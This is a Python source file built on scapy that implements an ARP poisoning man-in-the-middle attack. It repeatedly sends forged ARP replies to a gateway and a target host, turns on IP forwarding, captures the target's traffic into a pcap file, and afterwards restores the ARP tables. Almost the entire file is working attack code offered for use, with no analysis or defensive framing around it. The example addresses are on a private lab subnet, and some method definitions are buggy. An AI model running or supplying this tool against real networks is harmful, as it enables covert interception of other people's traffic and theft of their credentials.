from scapy.all import *
import os
import signal
import sys
import threading
import time
from netifaces import *
import netifaces as ni

class ARPattack:

    loop_bool = None

    def __init__(self, gateway_ip, gateway_mac, target_ip, target_mac, frequency, packet_count):
        #ARP Poison parameters
        self.gateway_ip = gateway_ip        #gateway_ip = "192.168.56.1"
        self.gateway_mac = gateway_mac
        self.target_ip = target_ip          #target_ip = "192.168.56.101"
        self.target_mac = target_mac
        self.frequency = frequency
        self.packet_count = packet_count    #packet_count = 1000
        self.poison_thread


    def start_attack(gateway_ip, gateway_mac, target_ip, target_mac, frequency, pkt_cnt):
        # Check the interface first
        ret = []
        try:
            f = open("/proc/net/if_inet6","r")
        except IOError and err:
            return ret
        l = f.readlines()
        for i in l:
            # addr, index, plen, scope, flags, ifname
            tmp = i.split()
            ret.append(str(tmp[5]))
        for interface in ret:
            ip = ni.ifaddresses(interface)[AF_INET][0]["addr"]
            if ARP(pdst=ip+"/24") == ARP(pdst=gateway_ip+"/24"):
                conf.iface = interface
                break
        #Start the script
        print(conf.iface)
        conf.verb = 0
        print("[*] Starting script: arp_poison.py")
        print("[*] Enabling IP forwarding")
        #Enable IP Forwarding on a mac
        os.system("sysctl -w net.inet.ip.forwarding=1")
        print("[*] Gateway IP address: %s" %gateway_ip)
        print("[*] Target IP address: %s" %target_ip)

        #ARP poison thread
        ARPattack.poison_thread = threading.Thread(target=ARPattack.arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac, frequency))
        ARPattack.poison_thread.start()

        #Sniff traffic and write to file. Capture is filtered on target machine
        try:
            sniff_filter = "ip host " + target_ip
            print("[*] Starting network capture. Packet Count: %d. Filter: %s" %(int(pkt_cnt) ,sniff_filter))
            packets = sniff(filter=sniff_filter, iface=conf.iface, count=int(pkt_cnt))
            wrpcap(target_ip + "_capture.pcap", packets)
            print("[*] Stopping network capture..Restoring network")
            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        except KeyboardInterrupt:
            print("[*] Stopping network capture..Restoring network")
            ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
            #sys.exit(0)

    #Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
    #correct MAC and IP Address information
    def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
        print("[*] Disabling IP forwarding")
        #Disable IP Forwarding on a mac
        os.system("sysctl -w net.inet.ip.forwarding=0")
        #kill process on a mac
        #os.kill(os.getpid(), signal.SIGTERM)
        ARPattack.loop_bool = False
        ARPattack.poison_thread.join

        return

    #Keep sending false ARP replies to put our machine in the middle to intercept packets
    #This will use our interface MAC address as the hwsrc for the ARP reply
    def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, frequency):
        ARPattack.loop_bool = True
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        #try:
        while ARPattack.loop_bool:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(int(frequency))
        #except KeyboardInterrupt:
        #    print("[*] Stopped ARP poison attack. Restoring network")
        #    ARPattack.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
